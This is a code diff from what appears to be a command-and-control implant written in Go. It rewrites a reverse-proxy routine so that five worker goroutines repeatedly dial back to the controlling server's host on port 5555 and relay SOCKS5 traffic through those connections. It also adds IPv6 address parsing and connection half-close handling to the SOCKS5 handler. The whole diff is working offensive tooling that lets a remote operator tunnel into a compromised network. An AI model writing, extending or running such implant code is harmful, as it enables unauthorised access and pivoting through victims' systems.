@@ -594,53 +594,75 @@ func updateBeaconInterval(cmd Command) {
 // The listener should demultiplex multiple SOCKS5 clients over the same connection or create one connection per SOCKS5 session.
 
 func startReverseProxy() {
-    proxyLock.Lock()
-    if proxyActive {
-        log.Println("[!] proxy already active.")
-        proxyLock.Unlock()
+    if proxyCancel != nil {
+        log.Println("[!] proxy already running")
         return
     }
-    proxyActive = true
-    proxyStopChan = make(chan struct{})
-    proxyLock.Unlock()
+
+    proxyCtx, proxyCancel = context.WithCancel(context.Background())
+
+    for i := 0; i < 5; i++ {
+        go proxyWorker(proxyCtx)
+    }
+}
+func proxyWorker(ctx context.Context) {
 
     parsed, err := url.Parse(serverURL)
     if err != nil {
         log.Printf("[-] proxy: cannot parse serverURL: %v", err)
         return
     }
+
     host := parsed.Host
     if strings.Contains(host, ":") {
         host = strings.Split(host, ":")[0]
     }
+
     remoteAddr := net.JoinHostPort(host, "5555")
+
+    log.Println("[+] proxy worker started")
 
     for {
         select {
-        case <-proxyStopChan:
-            log.Println("[*] proxy: stop signal received.")
-            proxyLock.Lock()
-            proxyActive = false
-            proxyLock.Unlock()
-            log.Println("[+] proxy: stopped.")
+        case <-ctx.Done():
+            log.Println("[+] proxy worker stopped")
             return
         default:
-            log.Printf("[*] proxy: connecting to %s ...", remoteAddr)
-            conn, err := net.Dial("tcp", remoteAddr)
-            if err != nil {
-                log.Printf("[-] proxy: failed to connect: %v", err)
-                time.Sleep(5 * time.Second)
+        }
+
+        log.Printf("[*] proxy: connecting to %s ...", remoteAddr)
+
+        conn, err := net.DialTimeout("tcp", remoteAddr, 10*time.Second)
+        if err != nil {
+
+            select {
+            case <-ctx.Done():
+                return
+            case <-time.After(5 * time.Second):
                 continue
             }
-            log.Printf("[+] proxy: connected to %s", remoteAddr)
+        }
 
-            go func(c net.Conn) {
-                defer c.Close()
-                handleSingleSOCKS5(c) // updated to handle a single SOCKS5 session per connection
-            }(conn)
+        log.Printf("[+] proxy: connected to %s", remoteAddr)
 
-            // wait before initiating a new connection
-            time.Sleep(2 * time.Second)
+        connDone := make(chan struct{})
+        go func() {
+            select {
+            case <-ctx.Done():
+                conn.Close()
+            case <-connDone:
+            }
+        }()
+
+        handleSingleSOCKS5(conn)
+        close(connDone)
+
+        conn.Close()
+
+        select {
+        case <-ctx.Done():
+            return
+        case <-time.After(2 * time.Second):
         }
     }
 }
@@ -750,6 +772,20 @@ func handleSingleSOCKS5(serverConn net.Conn) {
         dstPort = port
         log.Printf("[*] SOCKS5: resolved %s -> %s", domain, dstHost)
 
+    case 0x04:
+        addrBuf := make([]byte, 16)
+        if _, err := io.ReadFull(serverConn, addrBuf); err != nil {
+            log.Printf("[-] SOCKS5: failed to read IPv6 addr: %v", err)
+            return
+        }
+        portBuf := make([]byte, 2)
+        if _, err := io.ReadFull(serverConn, portBuf); err != nil {
+            log.Printf("[-] SOCKS5: failed to read port: %v", err)
+            return
+        }
+        dstHost = net.IP(addrBuf).String()
+        dstPort = binary.BigEndian.Uint16(portBuf)
+
     default:
         log.Printf("[-] SOCKS5: unsupported addrType %d", addrType)
         serverConn.Write([]byte{0x05, 0x08, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
@@ -786,6 +822,7 @@ func handleSingleSOCKS5(serverConn net.Conn) {
     }()
     go func() {
         _, _ = io.Copy(serverConn, targetConn)
+        closeWrite(serverConn)
         done <- struct{}{}
     }()
     <-done
@@ -834,3 +871,4 @@ func sanitizeHost(s string) string {
         }
         return b.String()
 }
+
